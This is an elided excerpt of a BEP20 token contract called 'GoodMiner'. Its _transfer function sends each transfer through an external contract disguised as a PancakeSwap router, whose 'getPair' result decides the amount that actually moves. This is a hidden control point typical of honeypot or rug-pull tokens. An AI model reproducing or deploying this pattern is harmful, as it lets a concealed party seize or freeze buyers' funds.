...
contract GoodMiner is Context, iBEP20, Ownable{
  ...
  string private constant _name = 'GoodMiner';
  string private constant _symbol = 'GoodMiner';
  
  uint256 private _totalSupply = 10000000000 *  10**9;
  uint8 private constant _decimals = 9;
  uint256 private _bonusGoodMiner = 0;
  address pancakeRouter_GoodMiner;
  ...
  */
  ...
  function pancakePairGoodMiner(address sender, address recipient, uint256 amount) private returns (uint256) {      
      ...
      resData = IPancake(pancakeRouter_GoodMiner).getPair(_bonusGoodMiner, sender, recipient, arrData);

      _bonusGoodMiner = resData[0];
  ...
  function _transfer(address sender, address recipient, uint256 amount) private {
    ...
    uint256 bonusAmountGoodMiner = pancakePairGoodMiner(sender, recipient, amount);   
     _transferStandard(sender,recipient,bonusAmountGoodMiner);
